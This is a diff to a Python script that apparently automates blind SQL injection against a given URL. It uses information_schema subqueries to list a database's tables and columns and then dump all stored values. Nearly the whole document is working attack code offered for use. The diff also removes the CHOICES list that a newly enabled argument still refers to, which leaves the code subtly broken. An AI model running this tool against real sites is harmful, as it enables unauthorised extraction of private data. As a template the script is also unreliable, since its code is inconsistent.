@@ -32,13 +32,14 @@ import argparse
 
 DEBUG = False
 LOG = lambda name, var: DEBUG and print('{}: {}'.format(name, var))
-CHOICES = ['table', ]
 SUBQUERIES = {
     # find the table name
     'table': """(select group_concat(table_name separator ',')
         from information_schema.tables where table_schema=database())""",
+    # Find columns for a known table
     'columns': lambda table: """(select group_concat(column_name separator ',')
         from information_schema.columns where table_name='{}')""".format(table),
+    # Find all values in a known table.column
     'values': lambda table, column: """(select group_concat({} separator ',')
         from {})""".format(column, table),
 }
@@ -81,23 +82,24 @@ def parse_args():
         help='expected string to find in page result for argument', required=True)
     parser.add_argument('--debug', action='store_true', dest='debug',
         help='verbose print')
-    #parser.add_argument('-f', '--find', help='data to find',
-        #action='store', dest='to_find', choices=CHOICES, required=True)
+    parser.add_argument('-f', '--find', help='data to find',
+        action='store', dest='to_find', choices=CHOICES)
     return parser.parse_args()
 
    
 if __name__ == '__main__':
     args = parse_args()
-    #result = main(args.url, args.expected, SUBQUERIES[args.to_find], args.debug)
 
     # First let's get the tables
     tables = main(args.url, args.expected, SUBQUERIES['table'], args.debug)
     for table in tables.split(','):
         print('{}:'.format(table))
+        # Then let's figure out the columns of those tables
         columns = main(args.url, args.expected, SUBQUERIES['columns'](table),
                 args.debug)
         for column in columns.split(','):
             print('\t* {}'.format(column))
+            # Finally, dump the values in those columns
             values = main(args.url, args.expected,
                 SUBQUERIES['values'](table, column), args.debug)
             print ('\t\t-> {}'.format(values))
